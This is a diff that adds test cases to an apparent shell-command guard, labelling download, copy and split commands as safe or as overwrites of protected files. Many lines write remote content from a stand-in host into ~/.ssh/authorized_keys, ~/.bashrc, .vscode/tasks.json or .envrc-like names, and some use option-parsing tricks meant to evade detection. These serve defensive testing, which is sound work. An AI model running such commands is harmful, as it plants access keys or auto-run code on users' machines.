@@ -389,3 +389,142 @@ posix safe | aws s3 cp ./x s3://b/k
 posix safe | aria2c -o .bashrc https://x.example
 posix safe | xh --download -o out.txt https://x.example
 posix safe | curl -O --output-dir build https://x.example/a.tgz
+# A copy tool's options and their values are not where it lands, and an
+# option the guard does not know may take the next word: then every operand
+# on this machine may be. The lines with the option before the operands, and
+# with an option the guard does not know in the middle, were `overwrite`
+# before too: they guard that reading against going back to the last word.
+posix finds=overwrite | aws --profile p s3 cp s3://b/k ~/.ssh/authorized_keys
+posix finds=overwrite | aws s3 cp --region us-east-1 s3://b/k ~/.ssh/authorized_keys
+posix finds=overwrite | aws s3 cp s3://b/k ~/.ssh/authorized_keys --profile p
+posix finds=overwrite | aws s3 cp s3://b/k ~/.bashrc --endpoint-url https://x.example
+posix finds=overwrite | aws s3 cp --frobnicate x s3://b/k ~/.bashrc
+posix finds=overwrite | gcloud --project p storage cp gs://b/k ~/.bashrc
+posix finds=overwrite | gsutil -o Credentials:x=y cp gs://b/k ~/.bashrc
+posix finds=overwrite | rclone --config /tmp/rc copy remote:x ~/.ssh/
+posix finds=overwrite | rclone copy remote:x ~/.ssh/ --config /tmp/rc
+posix finds=overwrite | rclone copy --progress remote:x ~/.ssh/
+posix safe | aws s3 cp s3://b/k ./out --profile p
+# aria2c's `-d` folder, with its `-o` name or the last part of the address,
+# and HTTPie's `-o` in a cluster, attached or not.
+posix finds=overwrite reason="writes to your SSH keys" | aria2c -d/home/me/.ssh -o authorized_keys https://x.example/k
+posix finds=overwrite | aria2c -d ~/.ssh https://x.example/authorized_keys
+posix finds=overwrite | aria2c -d ~ -o.bashrc https://x.example/k
+posix finds=overwrite | aria2c -d ~/.ssh https://x.example/
+posix finds=overwrite | http -do ~/.bashrc https://x.example
+posix@windows finds=overwrite | aria2c -d C:/Users/me/.ssh https://x.example/authorized_keys
+
+# A flag of a copy tool is no value for the next word, and an option of
+# which the guard does not know the letter may take it. The two lines with
+# `-D` were `overwrite` before the reading of options as well: they guard it.
+posix finds=overwrite | gsutil -D cp gs://b/k ~/.bashrc
+posix finds=overwrite | gsutil cp -D gs://b/k ~/.bashrc
+posix finds=overwrite | gsutil -i sa@x cp gs://b/k ~/.bashrc
+posix finds=overwrite | gcloud storage cp gs://b/k ~/.bashrc -s standard
+posix finds=overwrite | gcloud storage cp gs://b/k ~/.bashrc -Q x
+posix finds=overwrite | sftp -a host:k ~/.bashrc
+posix finds=overwrite | http -vo /home/me/.bashrc https://x.example
+posix finds=overwrite | xh -vo /home/me/.bashrc https://x.example
+
+# The files `split` writes are its prefix and a suffix.
+posix finds=overwrite reason="writes to your SSH keys" | split x.txt /home/me/.ssh/
+posix rules=overwrite,overwrite,overwrite | split -a 1 -n 3 x.txt /home/me/.bashr
+posix finds=overwrite | split -da 1 -b 10 x.txt /home/me/.ssh/id_rs
+posix finds=overwrite | csplit -f /home/me/.bashr x.txt 1
+posix safe | split -l 10 x.txt part-
+
+# A letter that is a flag after gsutil's command word is no value for the
+# next word, though it is one before it.
+posix finds=overwrite | gsutil rsync -i gs://b /home/me/.ssh
+posix finds=overwrite | gsutil rsync -u gs://b /home/me/.ssh
+
+# An option of `aws` with an optional value takes the next word only when it
+# is one of the choices, and one with several values leaves every operand a
+# place the copy may land.
+posix finds=overwrite | aws s3 cp --sse s3://b/k ~/.bashrc
+posix finds=overwrite | aws s3 cp --sse-c s3://b/k ~/.bashrc
+posix finds=overwrite | aws s3 cp --sse AES256 s3://b/k ~/.bashrc
+posix finds=overwrite | aws s3 cp s3://b/k ~/.bashrc --grants a b
+posix finds=overwrite | aws s3 cp s3://b/k ~/.bashrc --grants read=uri=x write=uri=y
+
+# The name of a piece ends in `--additional-suffix`, a format for `csplit`'s
+# suffix is only known when it runs, and when the names are not all judged a
+# pattern is, so a protected file it matches is caught.
+posix finds=overwrite reason="writes to a file a tool runs on its own" | split -a 1 -l 1 --additional-suffix=.json x.txt .vscode/task
+posix finds=overwrite reason="writes to a file a tool runs on its own" | csplit -f .envr -b 'c%.0d' x.txt 1
+posix finds=overwrite | split -l 1 x.txt .env
+posix safe | split -l 10 big.log
+posix safe | csplit big.log 5
+
+posix finds=overwrite | aws s3 cp --sse-c-copy-source s3://b/k ~/.bashrc
+posix finds=overwrite | aws s3 cp --request-payer s3://b/k ~/.bashrc
+posix finds=overwrite | aws s3 cp --request-payer requester s3://b/k ~/.bashrc
+
+# wget's `-P DIR` in a bundle of flags, and `--directory-prefix`, put the
+# download in that folder.
+posix finds=overwrite | wget -qP ~/.ssh https://x.example/authorized_keys
+posix finds=overwrite | wget -qNP ~/.ssh https://x.example/authorized_keys
+posix finds=overwrite | wget -nvP /home/me/.ssh https://x.example/authorized_keys
+posix finds=overwrite | wget -qP ~ https://x.example/.bashrc
+posix finds=overwrite | wget -qP~/.ssh https://x.example/authorized_keys
+posix finds=overwrite | wget -P ~/.ssh https://x.example/authorized_keys
+posix finds=overwrite | wget --directory-prefix ~/.ssh https://x.example/authorized_keys
+posix finds=overwrite | wget -q --directory-prefix=~/.ssh https://x.example/authorized_keys
+posix safe | wget -qP build https://x.example/a.tar.gz
+posix safe | wget -qNP build https://x.example/a.tar.gz
+posix finds=overwrite | wget -qO ~/.ssh/authorized_keys https://x.example/k
+posix safe | wget -qP build -O out.txt https://x.example/a.tar.gz
+
+# The pattern of the names not judged ends in `--additional-suffix` too, long
+# options are read by their prefixes, a `printf` format for the suffix is
+# expanded, and a piece sent to the output is written nowhere.
+posix finds=overwrite | split -l 1 --additional-suffix=.json x.txt .vscode/tas
+posix finds=overwrite | split --suffix=1 -l 1 x.txt .vscode/tasks.jso
+posix finds=overwrite | split -a 1 -l 1 --additional-s=.json x.txt .vscode/task
+posix finds=overwrite | csplit -n 1 -f .vscode/tasks.js --suffix='on%.0d' x.txt 1
+posix finds=overwrite | csplit --pre=.vscode/tasks.jso --suffix='n%.0d' x.txt 1
+posix finds=overwrite | csplit --dig=1 --pre=.vscode/tasks.jso --suffix='n%.0d' x.txt 1
+posix finds=overwrite | csplit -f .envr -b 'c%.0d' x.txt 1
+posix finds=overwrite reason="writes pieces that may be a hidden file such as the repository's history" | split -l 1 x.txt .envr
+posix safe | csplit -f out- -b '%02d.txt' big.log 5
+posix safe | csplit -f out- -b '%d.txt' big.log 5
+posix safe | split -n 1/3 x.txt .vscode/tasks.json
+posix safe | split -n l/2/3 x.txt .vscode/tasks.json
+
+# `--numeric-suffixes=FROM` and `--hex-suffixes=FROM` start the names at FROM,
+# and a format `csplit` is given may name more pieces than are judged.
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=c x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 --hex=c x.txt .envr
+posix finds=overwrite | split -n 2 -a 1 --hex-suffixes=b x.txt .envr
+posix safe | split -n 1 -a 1 --hex-suffixes=1 x.txt .envr
+posix finds=overwrite | csplit -f .vscode/tasks.jso -b 'n%d' big.log 5 '{*}'
+posix finds=overwrite | csplit -f .vscode/tasks.jso -b 'n%d' big.log 5 '{40}'
+posix finds=overwrite | csplit -f .vscode/tasks.jso -b 'n%.0d' big.log 5 '{3}'
+posix safe | csplit -f .vscode/tasks.jso -b 'n%d' big.log 5 '{3}'
+
+# GNU `split` reads the last of its options for the suffixes, and refuses a
+# FROM that is empty, not lower case hex, or past the names: no piece is
+# written. The pieces `csplit` makes past those judged are a pattern, not a
+# name only known when it runs, and a count too large to add is unbounded.
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=1 --hex-suffixes=c x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 --numeric-suffixes=1 --hex-suffixes=c x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=c -d x.txt .envr
+# A bare `-d`, `-x`, `--numeric-suffixes` or `--hex-suffixes` changes the
+# alphabet only: FROM stays that of the last option that gave one.
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=c -x x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=c --numeric-suffixes x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=c --hex-suffixes x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 --hex-suffixes=c -x -d -x x.txt .envr
+posix finds=overwrite | split -n 1 -a 1 -x --hex-suffixes=c x.txt .envr
+posix safe | split -n 1 -a 1 --numeric-suffixes=1 -x x.txt .envr
+posix safe | split -n 1 -a 1 --numeric-suffixes=c -x x.txt .envr
+posix safe | split -n 1 -a 1 --hex-suffixes=C -x x.txt .envr
+posix safe | split -n 1 -a 1 --hex-suffixes=C x.txt .envr
+posix safe | split -n 1 -a 1 --hex-suffixes= x.txt .envr
+posix safe | split -n 1 -a 1 --hex-suffixes=zz x.txt .envr
+posix safe | split -n 1 -a 1 --numeric-suffixes=99 x.txt .envr
+posix safe | csplit -s -f chap -b '%02d.md' book.md '/^# /' '{*}'
+posix safe | csplit -f part -b '%03d.log' app.log '/^START/' '{*}'
+posix finds=overwrite | csplit -f .envr -b 'c%.0d' x.txt 1 '{*}'
+posix finds=overwrite | csplit -f .envr -b 'c%d' big.log 5 '{18446744073709551614}'
+posix finds=overwrite | csplit -f .envr -b 'c%d' big.log 5 '{18446744073709551615}' 7
